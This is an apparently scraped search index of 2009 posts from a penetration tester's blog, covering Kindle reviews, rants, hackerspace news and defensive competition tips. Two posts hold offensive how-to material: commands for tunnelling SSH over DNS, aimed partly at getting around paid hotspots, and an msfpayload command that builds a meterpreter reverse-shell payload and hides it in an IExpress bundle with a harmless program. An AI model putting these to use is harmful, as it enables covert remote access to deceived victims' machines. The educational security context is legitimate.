to learn insane ways to crack the perimeter. This class relies heavily on the student knowing and using Olly Debugger, the Metasploit framework and understanding if not having written an full blown exploit before attempting this class. If you have taken the “Pentesting With BT” class and mastered all aspects of this class you might be ready to take Cracking the Perimeter. All attendees are eligible for 40 CPE credits if you are CISSP. We are limiting these classes to a maximum of 20 for Pentesting with BackTrack and 15-17 for Cracking the Perimeter - so if you are interested please contact us early and register completely to ensure your seat is saved. Thanks and I look forward to seeing you in class. Sincerely, Chris Hadnagy Operations Manager [www.offensive-security.com](http://www.offensive-security.com) [www.remote-exploit.org](http://www.remote-exploit.org) “back|track4 – So good it should be commercial” ","date":"2009-04-29","objectID":"https://malicious.link/posts/2009/2009-04-29-offensive-security-live-courses-for-2009/:0:0","tags":null,"title":"Offensive Security Live Courses for 2009","uri":"https://malicious.link/posts/2009/2009-04-29-offensive-security-live-courses-for-2009/"},{"categories":["cons","RSA"],"content":" Stolen from: http://www.flickr.com/photos/31513605@N05/ ","date":"2009-04-19","objectID":"https://malicious.link/posts/2009/2009-04-19-rsa-photos/:0:0","tags":null,"title":"RSA Photos","uri":"https://malicious.link/posts/2009/2009-04-19-rsa-photos/"},{"categories":["presentations"],"content":" DojoSec Monthly Briefings - April 2009 - Rob Fuller (mubix) from Marcus J. Carey on Vimeo. ","date":"2009-04-17","objectID":"https://malicious.link/posts/2009/2009-04-17-couch-to-career-in-80-hours-or-less/:0:0","tags":null,"title":"Couch to Career in 80 hours or less","uri":"https://malicious.link/posts/2009/2009-04-17-couch-to-career-in-80-hours-or-less/"},{"categories":["review","kindle"],"content":"Now, before you get all huffy about the title, it’s not what you think. Keep reading: It’s been 20 days since I received my Kindle 2 (word of warning, NEVER use USPS. Spend the money; it’s not worth the stress). But enough of lullygaging, let me get straight to it: ","date":"2009-04-08","objectID":"https://malicious.link/posts/2009/2009-04-08-kindle-2-review-putting-the-fire-out/:0:0","tags":null,"title":"Kindle 2 Review: Putting The Fire Out","uri":"https://malicious.link/posts/2009/2009-04-08-kindle-2-review-putting-the-fire-out/"},{"categories":["review","kindle"],"content":"Advertised Features: Email DOC, HTML/HTM, JPEG/JPG, GIF, PNG, BMP (Also, everything can be put in a ZIP for one time sending). All of these worked well, I very surprised that DOCX worked so well, and they actually prefer it (since it’s based on XML it comes out cleaner after the conversion). However when you start getting into the images, it can get a bit harry when going to higher resolutions. My Kindle locked up on a 3 MB hi-res PNG of my boys (remember this is after Amazon converted it). Email PDF As they say, this is experimental. There are desktop software converters (not specifically designed for the Kindle) that do a much better job (and are free). But we’ll talk more about that in the ‘hacks’ portion (Amazon charges 10 cents per PDF) Text to Speech Granted I haven’t used much other T2S programs in my day other than Microsoft ?Steve?. This is a feature that I find phenomenal. I am one of those types who sometimes can’t quite concentrate on the reading of a book, and when I get to that point I switch on the T2S and can keep enjoying the book. The only annoying part, but understandable, is in picture quotes or code snippets, it reads through them the best it can, which is sometimes painful. Fast Page Turns, Longer Battery Life, Improved Display, More Storage I can’t really attest to them being better or worse than the Kindle 1, but: It turns pages REALLY slow, and REALLY fast some times, kinda depends on it’s mood, time of the month, or position of the moon, not sure, but it isn’t due to the amount of content on the next page, amount of rapid fire page turns, or battery life. I can’t quite figure out the rhyme or reason. The battery life is phenomenal, I charge it once a week, possibly more if I’m reading a ton. I believe this is due to me turning off the 3G. You don’t need it on if you aren’t sending a doc or shopping for a book. The ’electronic paper’ reacts to light just as real piece of paper would. Looks better in high light conditions, and only has a glare if you’re pointing a light directly at it. This is where I got a bit miffed. The Kindle 1 had a SD card slot, the Kindle 2 had just 2 GB of flash storage. However, after putting umpteen PDFs, Docs, and even a couple audio books (Audible format and MP3). I still haven’t used up the space. Large Selection, Low Book Prices Their selection of technical books is quite lacking. And their prices are only a few dollars off something that you aren’t getting physically, something you can’t lend a friend or flip through. I agree with a bunch of the press that is going around hammering Amazon for their “9.99” advertising. But, there is a light at the end of the tunnel. Plenty of technical book publishers offer eBooks versions on their site (O’Reilly to name one) and their formats are Kindle friendly. You can find most of the books that you want, you just have to do a bit more digging than flipping through the Kindle Store Kindle Store (Blogs, Newpapers, Magazines) Alright, paying to read a blog is just plain bull. I don’t care if they deliver it in a pretty format. Newspapers I don’t feel much better about, but Magazines I can kind of understand. But I still run into the brick wall of why they are charging so much for something that you can’t share. 3G Wireless The power of the antenna on the Kindle is horrible. So much that I want to buy one of those “Seen On TV” cellular antenna boosting stickers. I understand the power struggle, battery life over connectivity, I get it. But let come on! Why do I go out of single if I set it down? But, back to an earlier point, I only have it on when I want to look for a book in the store or email one to my Kindle. It certainly isn’t a deal breaker for me. Browser No,.. just no. If this was 1995 and there was no dynamic content on pages this browser would have fit perfectly. If you must use this feature, look for the mobile sites, use those. Again, not a deal breaker, I have an iPhone that does browsing if needed, I don’t need my “book” to ","date":"2009-04-08","objectID":"https://malicious.link/posts/2009/2009-04-08-kindle-2-review-putting-the-fire-out/:1:0","tags":null,"title":"Kindle 2 Review: Putting The Fire Out","uri":"https://malicious.link/posts/2009/2009-04-08-kindle-2-review-putting-the-fire-out/"},{"categories":["review","kindle"],"content":"“Hacks” Converting PDFs the right and WRONG way: Do not waste your time with Stanza. Their iPhone eBook reader app is awesome, but the converter for PDFs is downright horrid. Use a program called MobiPocket Creator. Be sure to install the Publisher version when it asks during the install. It’s a convoluted process, but your end result is SO much better than both the Stanza way, and Amazon’s own converter. Follow the 6 steps: HERE. And you’ll be fine. Yes, it’s a Windows program. I haven’t researched Mac programs, and the Linux ones where just two complicated to be useful. If you MUST use the browser, turn on Advanced Mode and Javascript. The Kindle has compartmentalized it’s Settings, so go into the Experimental -\u003e Browser and then Menu-\u003e Settings. Use your pads. If you are used to typing, you use the tips of your fingers. Typing on the Kindle works SO much better if you use the pads of your fingers. Want to save a bit of code for later? Highlight it. It will go into your “My Clippings” in and you’ll not only be able to access it and see the whole clipping, but you’ll be able to go directly to that line (Kindle doesn’t use pages) in the book, and be able to read back up if needed. Even if that book is way back in your history. Cheat Sheets. I created my own cheat sheets in Word, converted some of the ones Ed Skoudis made and a munch of others, now I have them on my Kindle and have access to them at a moments notice. Those familiar with ClickScripts will really enjoy this aspect of the Kindle. Wrap your head around that it’s not just for books, and you’ll start seeing a whole new world of things you can put on your Kindle. ","date":"2009-04-08","objectID":"https://malicious.link/posts/2009/2009-04-08-kindle-2-review-putting-the-fire-out/:2:0","tags":null,"title":"Kindle 2 Review: Putting The Fire Out","uri":"https://malicious.link/posts/2009/2009-04-08-kindle-2-review-putting-the-fire-out/"},{"categories":["review","kindle"],"content":"What would put the Kindle on FIRE Just one request, but it would hands down make the Kindle worth every cent of the 350 price tag. I want Amazon to take the contents of an email, if no other attachments exist, and send it to me as text or HTML on my Kindle. This helps me two fold. First, if I have a lengthy email that I want to read later, I can do so without straining on my iPhone to read it. Second, I can use Google Reader’s email article function to turn the Kindle into an off-site Google Reader. ","date":"2009-04-08","objectID":"https://malicious.link/posts/2009/2009-04-08-kindle-2-review-putting-the-fire-out/:3:0","tags":null,"title":"Kindle 2 Review: Putting The Fire Out","uri":"https://malicious.link/posts/2009/2009-04-08-kindle-2-review-putting-the-fire-out/"},{"categories":["review","kindle"],"content":"Conclusion Yes, I do think I made a great choice in my selection over a Netbook. With any technology, especially one that pushes the industry, there will be positives and negatives. But, I am reading more, and thoroughly enjoying a small sneak preview of F0rb1dd3n by my good friend Jayson Street. Bottom line, it’s a solid buy. I would highly suggest it for anyone on the go, people who never can find the time to read, and people who don’t like carrying a library with them everywhere. ","date":"2009-04-08","objectID":"https://malicious.link/posts/2009/2009-04-08-kindle-2-review-putting-the-fire-out/:4:0","tags":null,"title":"Kindle 2 Review: Putting The Fire Out","uri":"https://malicious.link/posts/2009/2009-04-08-kindle-2-review-putting-the-fire-out/"},{"categories":["rant"],"content":" Last Friday (March 6th, 2009) I posed the question above. What I got in return was nothing short of amazing, and to tell you the truth, it amazed me how the tally rounded out. I categorized the answers and counted them up (MANAGERS, listen up!): (12 votes) - Security Fundamentals: This category involves the application of A/V, IDS/IPS, basic safe surfing techniques, least privilege use, and an understanding of phishing. It astounds me that this is at the top of the list. I grouped all of these answers together because they truly are the BASICS of Information Security. Why after all these years have managers of security professionals not gotten this drilled into them to the point of bleeding? What are we doing wrong? (8 votes) - Targeting: “We aren’t a target”, “There isn’t anything on saying we are getting attacked”. This is another that surprised me to be at the top of the list. How can managers not think that 1. that they are a target, and 2. think that because there aren’t any alarms going off, they aren’t getting attacked? (6 votes) - Passwords: Complexity, not using stickies, rotation, etc. I left this out of Security Fundamentals, because it’s not an easy beast to over come. It’s something that definitely needs to be addressed and a plan set down for the application, enforcement and technology behind it. (6 votes) - Compliance and Policy: Everyone in this category made it abundantly clear that compliance to a standard does NOT mean that you are secure, but not at least making the compliance bar is worse. Internal policies need to be created to provide a stricter regimen then the compliance checklist demonstrates. (5 votes) - Accountability: From basic user to CEO and Security Analyst. Accountability has many faces but it usually shows none of them in the security world. Users of the world learn quick when one of coworkers get restricted access because they clicked test phishing after they had just gone through phishing training. (5 votes) - Defense In Depth: This is an old concept as well, but in recent years have been twisted to include DiD at host and network infrastructure level. The phrase Defense In Dept will continue to grow as the depths at which we can put protections on info systems grows. You need to realize that you ARE a target and you NEED to move with this evolution, not ignore it. Doing so doesn’t make it “go away” (3 votes) - Users are stupid: I can’t believe that this even made it as an item. Managers, you seriously don’t understand that your weakest link on your network is the users? (2 votes) - Data Layer Protection: Encryption. Even if the client data is stored on a super “secure” data node, that doesn’t mean somewhere between point A and point B isnt’ compromised. If it’s sensitive or secret, it needs to be treated as such at EVERY juncture where that data is transferred or can be accessed from. (2 votes) - Risk Management: Managers, this is supposedly your specialty. Get back to it, they want you to be open to understand technically why this or that isn’t a threat. (1 vote) - Company buy-in: I am truly surprised this didn’t make the top of the list. I personally think that company buy-in to security should precede the rest of the categories. This is simply a top 10 list of things we as Security Professionals want you to know. It would not be hard to create training in your organization around these 10 categories. If you are a manager or one of us, get it started, make the slides and start getting these topics nailed down. I have included the raw tweets from the poll so that you as managers can understand what your people want you to learn: lorddrachenblut passwords dont go on post it notes taiyed The importance of protecting client data with encryption. oneeyedcarmen Compliance != Security clamasters - http://www.curtis-lamasters.com/ definitely not my quote but “If you can’t measure it, you can’t improve it” Put that into security terms and make sure he understands techsnax - http://techsnax.blogs","date":"2009-03-14","objectID":"https://malicious.link/posts/2009/2009-03-14-manager-training-camp-bootcamp-style/:0:0","tags":null,"title":"Manager Training Camp - Bootcamp Style","uri":"https://malicious.link/posts/2009/2009-03-14-manager-training-camp-bootcamp-style/"},{"categories":["rant"],"content":"First I wanted to say, sorry for this and the last installment of Room362 being non-technical. They are topics that I feel strongly about and so felt impelled to share.One of the biggest problems in the world, IMHO, are people who have unfounded hate. This is compounded by the anonymity of the Internet. Allowing that hate to have no reprocussion or identity. Let me also say I have a deep respect for Free Speech, the depths of which I fear, few truly know. What I don’t have a respect for is people who abuse that right. It’s ultimately a respect of your fellow man/woman/it, that transends any nationality, race, creed, or color. Now that you know where I stand, let me step down to a slightly lower soap box. On my last post about ethics, I received a comment from an individual who posted under the guise of not only a false email and name, but also from a proxied address. They were on my side of the argument and were digusted with Dave’s. His/her/it’s post was pointed, rude, and had no constructive criticism or facts. It was deleted. It does not deserve a direct response. So I am issuing a response to all who tred here. These types of posts are allowed to flow on other forums, blogs, and mediums of the Internet. **They WILL NOT be allowed here. Period. ** You may think of me what you will, pompous, self righteous. I don’t care. I will keep my bit of the Internet clean how I see fit. Lastly, I hope I demonstrated this fact already, but I want to reiterate it here. I will never delete comments on any side of any discussion I have here, even if I disagree with the comment. I enjoy debat and discussion. I am religous in my faith fight for free speech and it’s application on the internet. You have something to say fine. You better do it with respect or you can take your posts to slashdot, digg, or some other place. They won’t see the light of day here. ","date":"2009-03-13","objectID":"https://malicious.link/posts/2009/2009-03-13-anonymass-hiding-behind-the-tubes/:0:0","tags":null,"title":"AnonymASS - Hiding Behind The Tubes","uri":"https://malicious.link/posts/2009/2009-03-13-anonymass-hiding-behind-the-tubes/"},{"categories":["rant"],"content":"My recent post “OzymanDNS - Tunneling SSH over DNS” caused a good friend, and someone I highly respect in the information security field, Dave Hull from Trusted Signal, to call me out on the ethics of the post. Instead of lying to you, Dave, and to myself, I did not put any thought into the ethics of the post until Dave brought it up. Well, except for that auto subconscious RIGHT/WRONG check. However, I have done a lot of thinking on it since Dave’s message to me, I came up with a number of reasons why the post is not unethical and a number of reasons why it was. So I am going to post my thoughts and would like to know what you think. I hardly think there is or ever will be a solid white line of ethics but lets see if we can discuss it a bit. Ethical: Teaching people to do anything, is at it’s core, simply that. It doesn’t make them do it. The flip side of this coin will be in the unethical side so don’t get your Anti-NRA panties in a bunch yet. Offensive Security, SANS, C|EH (no they don’t teach ethics even though it’s in the name of the cert), and all the other “Penetration Testing” courses are teaching hacking. The phrase “Penetration Testing” was created so that we could pass it off to our bosses as a needed service without scaring them. Unethical: Specifically in the post it is targeting Hotspots that charge money. Skirting this is illegal, and could land some jail time, or at least make you spend some time in airport holding, making you miss your flight. I did not put a disclaimer in the post, and I probably should have. Hak5 has a huge following of impressionable teens, who may or may not be mature enough to handle this information in the correct manor. So, was the post unethical because it sounds like I put my stamp of approval on illegal activities? Would it have been more ethical with a disclaimer? Would have been more ethical without the targeting of hotspots? Should I take the post down? My decision after considering everything? To leave it up, while adding a disclaimer. It is not my job to raise the worlds kids with a solid basis of ethics, but it is my responsibility not to endorse illegal activity to those who follow my activity online. Thanks Dave, I look forward to your comments, and anyone else’s who would like to chime in on the issue. ","date":"2009-03-11","objectID":"https://malicious.link/posts/2009/2009-03-11-the-ethics-of-teaching-hacking/:0:0","tags":null,"title":"The Ethics of Teaching Hacking","uri":"https://malicious.link/posts/2009/2009-03-11-the-ethics-of-teaching-hacking/"},{"categories":["hak5","dan kaminskey","dns"],"content":"Hak5 Episode 504 Shownotes (In the episode I say that it’s cross platform, use the release links for the Windows binaries to get it working on windows or use cygwin) ","date":"2009-03-10","objectID":"https://malicious.link/posts/2009/2009310ozymandns-tunneling-ssh-over-dns-html/:0:1","tags":null,"title":"OzymanDNS - Tunneling SSH over DNS","uri":"https://malicious.link/posts/2009/2009310ozymandns-tunneling-ssh-over-dns-html/"},{"categories":["hak5","dan kaminskey","dns"],"content":"DISCLAIMER - I IN NO WAY ENDORSE ILLEGAL ACTIVITIES - USE THE FOLLOWING GUIDE IN A TEST ENVIRONMENT OR AT YOUR OWN LEGAL RISK. UPDATE:Thanks to Chris Gates and Robin Wood for pointing me towards a fixed up version of OzymanDNS and a great tutorial: HERE UPDATE 2: Since Ozyman is no longer hosted on Dan’s site, I have posted it here: Download: ozymandns_src_0.1.tgz (Until of course/if he asks me to take it down) DNS Tunneling isn’t new. Dan Kaminsky’s post for OzymanDNS’ release was July 29th 2004 (There was DNS Tunneling linux packages dating back to the late 90s even). I will however comment that it’s still in it’s release version, but very functional. Also, DNS Tunnel isn’t “Big News” so it really hasn’t been ‘mitigated’ anywhere yet. Everywhere I have tested it, it has worked, even behind a certain switch that rhymes with ‘Panera’ What does OzymanDNS do? It has two parts, server, and client. The server is a set and forget. It sits there waiting for a connection (caveat: from anywhere) But we are getting ahead of ourselves, lets setup up DNS first. (I’m going to assume that you have a SSH server somewhere that you have already setup) ","date":"2009-03-10","objectID":"https://malicious.link/posts/2009/2009310ozymandns-tunneling-ssh-over-dns-html/:0:2","tags":null,"title":"OzymanDNS - Tunneling SSH over DNS","uri":"https://malicious.link/posts/2009/2009310ozymandns-tunneling-ssh-over-dns-html/"},{"categories":["hak5","dan kaminskey","dns"],"content":"Step 1 - DNS Setup: Each “Domain Manager” or DNS Server has a different set up, So I’m not going to go into the details. The jist of the change you need to make is either make a domain or a subdomain that points it’s nameserver records towards the host that you are running your server on. ihaztunnel.room362.com IN NS mubixpwnsyour.homedns.org In this example we have setup a subdomain called “ihaztunnel” and set it’s Name Server Record pointing to a dynamic dns host that points at the location of my OzymanDNS server. ","date":"2009-03-10","objectID":"https://malicious.link/posts/2009/2009310ozymandns-tunneling-ssh-over-dns-html/:0:3","tags":null,"title":"OzymanDNS - Tunneling SSH over DNS","uri":"https://malicious.link/posts/2009/2009310ozymandns-tunneling-ssh-over-dns-html/"},{"categories":["hak5","dan kaminskey","dns"],"content":"Step 2 - Server Setup: You need Perl, the MIME::Base32, and Net::DNS modules. After that you just run nomde.pl from whatever directory that you extracted the OzymanDNS scripts with the following context: ./nomed.pl -i 0.0.0.0 ihaztunnel.room362.com This tells it to listen on any IP the host has (you can specifiy one if you wish), and tells it the DNS name that it’s supporting. Don’t forget to do port forwarding on your router or whatever may be in the way of port 53 UDP and TCP coming inbound. Also keep in mind that your ISP may be blocking, so field test the connection before you try to use it in the wild. ","date":"2009-03-10","objectID":"https://malicious.link/posts/2009/2009310ozymandns-tunneling-ssh-over-dns-html/:0:4","tags":null,"title":"OzymanDNS - Tunneling SSH over DNS","uri":"https://malicious.link/posts/2009/2009310ozymandns-tunneling-ssh-over-dns-html/"},{"categories":["hak5","dan kaminskey","dns"],"content":"Step 3 - Client Connection: For the client, the setup is the same, get perl, the modules and OzymanDNS. Then you run the following command: ssh -D 8080 -C -o ProxyCommand=\"/home/mubix/ozymandns/droute.pl whatever.ihaztunnel.room362.com\" room362.com Breaking this command down: “-D 8080” starts SSH tunneling (Socks Proxy) on port 8080 once a connection is made. “-C” requests compression so that we can get the best speeds possible. “-o ProxyCommand” sets the SSH option to the location of the droute.pl script and… “whatever.ihaztunnel.room362.com” the ‘whatever’ portion of this is the important part. It can be whatever you want it to be but the “magic” happens by adding this subdomain of the one you already set up. “room362.com” the hostname or IP of the SSH server that you will be tunneling through. If all worked out, you will get prompted to enter your password. That’s it folks. Now you can use FoxyProxy or just your standard proxy settings to use the tunnel. Or, you can use product that, IMHO, is well worth the 30 bucks for the PORTABLE EDITION: Proxifier. It hooks the OS and makes every connection go through the proxy (games, IM, Java, Flash). Notes: Before you go the DNS route, it might pay off to try the ?.jpg trick first. Check out the debuggable.com post for more details. - Thanks Xanfantasy for the memory jog. http://www.dnstunnel.de/ - A site that has an in-depth walk-through of setting up OzymanDNS if I didn’t answer all of your questions. They even have a script that will make OzymanDNS a service on Linux boxes http://thomer.com/howtos/nstx.html - A write up on NSTX which doesn’t require SSH but doesn’t look like it’s still in production. It is however in the Ubuntu and Gentoo repositories so feel free to mess with it there, and since Back|Track 4 is now Ubuntu based you may be able to get it set up on BT4 as well. Iodine: http://code.kryo.se/iodine/ - Another DNS Tunneling project that looks to be the most up to date. I haven’t tested it out to make sure it functions. Dns2tcp: http://www.hsc.fr/ressources/outils/dns2tcp/index.html.en - Another DNS Tunneling Project And if DNS isn’t your thing and you want to tunnel over HTTP, check out Corkscrew: http://www.agroman.net/corkscrew/ ","date":"2009-03-10","objectID":"https://malicious.link/posts/2009/2009310ozymandns-tunneling-ssh-over-dns-html/:0:5","tags":null,"title":"OzymanDNS - Tunneling SSH over DNS","uri":"https://malicious.link/posts/2009/2009310ozymandns-tunneling-ssh-over-dns-html/"},{"categories":["iexpress","metasploit"],"content":"Update to post: Metasploit Heart’s Microsoft Ok, so many people had issues with the Vimeo video, that I posted it to youtube in hopes that you’ll be able to play it all the way through. I still have no idea what the issue is, it’s played perfectly on all the computers that I’ve tried it on. ","date":"2009-03-09","objectID":"https://malicious.link/posts/2009/2009-03-09-metasploit-3s-microsoft/:0:0","tags":null,"title":"Metasploit \u003c3s Microsoft","uri":"https://malicious.link/posts/2009/2009-03-09-metasploit-3s-microsoft/"},{"categories":["rant","kindle"],"content":"Recently I have been debating on whether to get a Netbook or the Kindle 2. (I am only in this debate because my lovely wife decided to buy a table and chairs, for the house. There is no winning when they buy things for ’the house’ or ’the kids’). Anyways, I tweeted up my dilemma and got a huge amount of responses. They came from both sides of the fence. Some said Kindle and some said Netbook, and they all had good arguments. But, being the gadget nerd that I am and having owned a netbook before I started to lean towards the Kindle. Until I looked at the Kindle store.. When you hear about the Kindle you hear about the cheap books (no argument there), the free EVDO (still no argument), and the fact that you can read blogs and magazines. This is where the marketing people caught me. I am a huge blog reader. I currently have 2700+ blogs in my google reader OPML (I can usually hit them all in less than an hour with a process I’ve refined, so don’t think too lowly of me). So the fact that I could read my blogs and the occasional book, and even send pdfs to the Kindle got me excited about the product. I put the Kindle 2 in my shopping cart at Amazon, added a leather case just for S\u0026G, and looked back at TweetDeck for any last comments people had. @hmjgriffon was completely against buying the Kindle, so I decided to try out sending a PDF to the Kindle app Amazon has for the iPhone. I had installed it a couple nights ago and hadn’t tested it. This is where the charges started rolling in. First I find out that it is 10 cents per PDF that I have converted for use on the Kindle/iPhone App. Then I looked into the blogs, you know, just to try at least SOMETHING out before I bought it. The few blogs that they support are either 99 cents or 1.99 a month. Wait.. so let me get this straight. I have to pay $1 or $2 to view a blog that is free? No thanks. I mean they could do something cool and special with the blog, but I don’t see the market. Magazines, maybe, I think I would probably subscribe to CPU or Linux Journal if it came via Kindle (definitely 2600..). So, I stopped, and complained on twitter about it. Then a couple people started shouting solutions, and @wardspan pointed me towards a Kindle book (and said it contained the secret to using Google Reader on the Kindle free): The Complete User’s Guide To the Amazing Amazon Kindle 2: A Kindle Owners Toolkit Of Over 500 Tips, Tricks, \u0026 Links (For Amazons Revolutionary e-Book Reader \u0026 Free Wireless Web Browser) (Kindle Edition) I decided to purchase it (0.99) and read it on my iPhone, for not only the contents of the book, but to kind of gauge the service for myself before I buy. I think that 99 cents is a minimal cost to find out if the Kindle truly is for me. Hope this helps those of you who are on the fence like me. ","date":"2009-03-05","objectID":"https://malicious.link/posts/2009/2009-03-05-kindle-or-notebook-2-kindle/:0:0","tags":null,"title":"2 Kindle or Not(ebook) 2 Kindle","uri":"https://malicious.link/posts/2009/2009-03-05-kindle-or-notebook-2-kindle/"},{"categories":["rant"],"content":" Most of you Twitterholics have seen this beautiful status. You get a total of 100 API calls per Twitter account per hour. What happens if you use all of your afforded calls? You can just use http://www.twitter.com/ no problem right? Well you loose a lot of what makes Twitter clients so useful (search, grouping, instant updates.. etc). Well, what if you leave you client up at home? TweetDeck by itself uses most of the API calls just by itself. So in this scenerio, you are destined (at least for that day) to spend it on the twitter site, which as we already discussed, leaves much to be desired. Mom taught me never to point out a problem without suggeting a solution, so here is what I think would be an awesome addition to Twitter, that might have other advantages as well: This is at the bottom of gmail. It allows you to see where else your account is being accessed from (IP). You can also click “Details” and click to log out of all other sessions. This would be nice in twitter for a couple reasons. It would allow you to block/logout the client you left at home, but also check to make sure the IPs that are accessing the API on your behalf are your own. Just a suggestion.. ","date":"2009-03-04","objectID":"https://malicious.link/posts/2009/2009-03-04-twitter-api-problem/:0:0","tags":null,"title":"Twitter API Problem","uri":"https://malicious.link/posts/2009/2009-03-04-twitter-api-problem/"},{"categories":["iexpress","metasploit"],"content":" Hiding Meterpreter with IExpress from mubix on Vimeo. Using the IExpress, a built in tool (XP, not sure about other Windows versions), we package two executables together, so that the target is less likely to suspect foul play. Now, I used calc.exe, but you can use anything on both sides of the coin. Use a better game so that it’s easyier to dupe, or a different malicious executable (leekspin perhaps?). I’ll let your minds take this to the level I know you all are capable of. One caveat is that the icon for the executable is that of the self extractor, which shouldn’t be that much of an issue to change, but I don’t know off the top of my head of an app that does it, so please comment and let me know if you do. Commands from video: ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=1080 X \u003e /tmp/academy/bob.exe (For python 2.4+) python -m SimpleHTTPServer (For python 2.3 -) python -c “from SimpleHTTPServer import test; test()” Start -\u003e Run -\u003e iexpress Run multi/hander from command line (not shown in video) Links from video: http://www.metasploit.com/ http://www.shell-fu.org/ http://www.microsoft.com/technet/prodtechnol/ie/ieak/techinfo/deploy/60/en/iexpress.mspx?mfr=true http://www.virustotal.com/ http://www.theacademypro.com/ http://www.theacademyhome.com/ ","date":"2009-03-02","objectID":"https://malicious.link/posts/2009/2009-03-02-metasploit-hearts-microsoft/:0:0","tags":null,"title":"Metasploit heart's Microsoft","uri":"https://malicious.link/posts/2009/2009-03-02-metasploit-hearts-microsoft/"},{"categories":["ccckc","hacker spaces","press release"],"content":"Official Press Release: February 24th, 2009. Kansas City, MO - The Cowtown Computer Congress (CCCKC) is happy to announce the opening of their Underground Lab to the public with a full week of events Beginning on March 2nd, the grand opening showcase the rich and vibrant community of creative minds in the Kansas City area. CCCKC, the first organization of its kind in the midwest, will serve the community by providing technology classes, donating unique projects to local organizations and technology assistance to those in need. The week will kick off on Monday, March 2nd with an open house for individuals and organizations who are interested in learning more about the organization and how they can take advantage the Underground Lab for meetings, classes and other activities. The creative talents of CCCKC members will be showcased on Wednesday March, 4th. The member project showcase will be followed by a screening of Make:TV, a public television series which will be shown for the first time in the Kansas City area that night. If you’re curious about what CCCKC and the maker culture are all about, this is the night to come be inspired. Projects to be showcased range from alternative methods of energy generation to a labyrinth game which is controlled with the balance board from a Nintendo Wii Fit. Thursday, March 5th is the regular member meeting where members come together to discuss group projects being developed for donation to local organizations and plan future community service projects like our monthly free computer repair opportunities. Friday evening will feature a slate of speakers covering topics ranging from improving home security and information management to protecting data from theft while using public wireless internet. On Saturday the public is invited to take part in a range of free workshops on basic electronics and soldering, e-textiles and Nintendo Wii hacking. All day members will be available to assist members of the public choose, install and configure computers using the free and open source Linux operating system. About The Cowtown Computer Congress The Cowtown Computer Congress (CCCKC) is a not for profit technology cooperative founded to advance technology of all kinds. They are a member supported organization providing technology classes, workshops and services to the public free of charge. CCCKC brings together some of the finest minds in midwest to collaborate on research and projects for other local groups. Through their affiliate program, CCCKC gives assistance to specialized technology user groups by providing them with a facility to hold meetings and work on projects of their own. CCCKC’s Underground Lab is located 85 feet below the surface of the earth at 31st Street and Southwest Trafficway in Kansas City, Missouri. http://www.cowtowncomputercongress.org Further inquires should be made to: press@cowtowncomputercongress.org or to John Benson - President and Co-Founder 816-332-6389 So if you live in Kansas City or surrounding area, please go check out CCCKC. If you live in Washington D.C. or surrounding areas also check out http://www.hacdc.org/ and for all other locations around the world, check out http://www.hackerspaces.org/ ","date":"2009-02-26","objectID":"https://malicious.link/posts/2009/2009-02-26-the-cowtown-computer-congress-opens-their-underground-lab/:0:0","tags":null,"title":"The Cowtown Computer Congress Opens Their Underground Lab","uri":"https://malicious.link/posts/2009/2009-02-26-the-cowtown-computer-congress-opens-their-underground-lab/"},{"categories":["iphone","rant"],"content":"(This is the 3rd time I am writing this post, FF Fail, then Word crashed, so please excuse the lack of passion) The moment that PDANet published that they released an updated version that allows USB tethering, I ran home and “QuickPWNd” my phone (which took all 5 minutes). Loaded the app and now I had the coveted TETHERING. I was free of my bind to Comcast or Free Public Wifi. However, over the next few months, my iPhone started getting slower and slower to respond. Crashes happened on apps that never had a problem before (including Safari). It would even crash on incoming calls. 5 minutes ago (now more like 20), I had it crash again and slow responsiveness down to unbearable speeds. (2 minutes from touch to fully started app). When I had an internal debate: Would I go home and de-PWN it, or deal with it? With that same thought I realized that at the core of most of the technologies we use today, Windows, Twitter, MySpace (now Facebook), is an underlying need, freedom, or other feature that they provide that makes them ‘bearable’. Twitter’s FAIL WHALE is famous because Twitter crashes or is down A LOT. Why do you still use it? Windows is an utter mess of code and BSOD even had a hardware device made for it. Why do you still use it? …you get the point. I’m not going to revert my iPhone back. You know why? Because the freedom that it provides me, (like typing a blog post for the 3rd time going 65 miles an hour in the back seat of a car) is worth it, to me. ","date":"2009-02-23","objectID":"https://malicious.link/posts/2009/2009-02-23-my-iphone-runs-windows/:0:0","tags":null,"title":"My iPhone runs Windows","uri":"https://malicious.link/posts/2009/2009-02-23-my-iphone-runs-windows/"},{"categories":["ccdc","competition"],"content":"Let me start off this post by saying that the main focus of any of these competitions is not to win, but to learn. Learning is usually accompanied by tears on the defenders side, but the best way to learn is to fail. That said though, the title of this post is about how to win: ","date":"2009-02-20","objectID":"https://malicious.link/posts/2009/2009-02-20-winning-hacker-competitions-as-defenders/:0:0","tags":null,"title":"Winning Hacker Competitions as Defenders","uri":"https://malicious.link/posts/2009/2009-02-20-winning-hacker-competitions-as-defenders/"},{"categories":["ccdc","competition"],"content":"Planning Phase: This is where you win or lose. If you don’t have a good plan and a good team layout ahead of time, you are screwed. We (the ‘red cell’) will walk all over the fact that you can’t get your team organized and execute. Know your infrastructure: Assign people not only to the different parts, but to also learn those parts BEFORE go time. Practice. Team Organization: This means that you are going need assigned team leads. For instance this is how you can have it laid out for a 5 person team and what their roles would do. 1. **Team Lead**: This person needs to lead. Duh right? Well there is more to it; they need to know each of the other roles on a generic technical level. They also have to be to go-to person, any calls that come in as 'business injects', emails, whatever, they need to be the one to deal with it. They also need to be up to date with what each person is doing and keeping them on task. They should not be on a keyboard unless they are really needed to be (i.e. supporting lunch switch outs, or responding via email to a biz inject) 2. **Patch / Software Retrieval / Software Installation**: This is the gopher. He / She needs to know the best and fastest ways to download patches and software that will be needed. And how to get them to install quicker or in the background. Generating a list of links and posting them somewhere online so that you can just go to that page and click down the list will help extremely, especially if you aren't allowed to take anything into the competition (i.e. USB drives). (google: ctupdate4). The list should include direct links to patches, av, known good software that each team member will need, etc other. And possibly bundle it up so that it is just that much faster to pull down. Use a download manager to pull it down (DownThemAll w/ FireFox). Every second you waste on waiting for software is more time for a 'red cell' member to entrench themselves. 3. **Incident Responder**: At first this person may not be busy, but needs to know incident response inside and out. How to check for network connections, and rouge processes. Needs to have a list of services that run on a Windows 2000, XP and 2003 box. This would also be the keeper of the password list and the person to make the call when passwords need to be changed. But more on that later. Know TCPView, Autoruns, and Procexp like the back of your hand, and rename the executables so that when the red cell looks for you running monitoring tools they won't be able to differentiate. 4. **Infrastructure / Linux Guru**: This person needs to know Cisco and Linux. Know how to set passwords for the interfaces, vty, console, aux and so on. Know how to encrypt those passwords. Know how to turn off unneeded ports (nudge nudge). Have a print out of commands to do 